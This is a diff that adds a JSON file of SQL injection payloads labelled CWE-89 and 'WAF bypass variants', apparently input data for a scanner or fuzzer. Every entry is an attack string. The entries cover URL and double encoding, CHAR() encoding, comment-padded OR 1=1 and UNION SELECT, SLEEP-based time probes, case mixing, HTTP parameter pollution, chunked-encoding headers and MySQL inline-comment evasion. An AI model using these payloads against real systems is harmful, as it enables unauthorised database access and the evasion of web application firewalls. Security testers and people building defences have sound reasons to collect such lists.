@@ -1,0 +1,16 @@
+{
+  "variants": {
+    "encoding": ["%27", "%2527", "%u0027", "%u0027%u0027", "%27%20OR%20%271%27%3D%271", "0x27", "0x2700", "CHAR(39)", "CHAR(39,65,76,83,79,32,49,61,49)"],
+    "whitespace": ["'/**/OR/**/1=1", "'/**/UNION/**/SELECT/**/NULL--", "';/**/SLEEP(5)--", "'%09OR%091=1", "'%0aOR%0a1=1", "'%0dOR%0d1=1", "'\tOR\t1=1", "'\nOR\n1=1"],
+    "case_variation": ["' Or '1'='1", "' oR '1'='1", "' UnIoN SeLeCt NULL-- -", "' AnD SlEeP(5)-- -", "1' OrDeR By 10-- -"],
+    "hpp": ["id=1&id=' OR '1'='1", "id=' OR 1=1-- -&id=1", "id=1%26id=%27OR%271%27%3D%271"],
+    "chunked": ["Transfer-Encoding: chunked", "Content-Length: 0", "Transfer-Encoding: chunked\r\nContent-Length: 0"],
+    "inline_comment": ["'/*!50000OR*/'1'='1", "'/*!50000UNION*//*!50000SELECT*/NULL-- -", "'/*!OR*/1=1-- -", "1'/*!50000ORDER*/BY 10-- -"]
+  },
+  "payloads": ["%27", "%2527", "'/**/OR/**/1=1", "' oR '1'='1", "id=1&id=' OR '1'='1", "'/*!50000OR*/'1'='1"],
+  "markers": [],
+  "metadata": {
+    "cwe": "CWE-89",
+    "technique": "WAF bypass variants"
+  }
+}
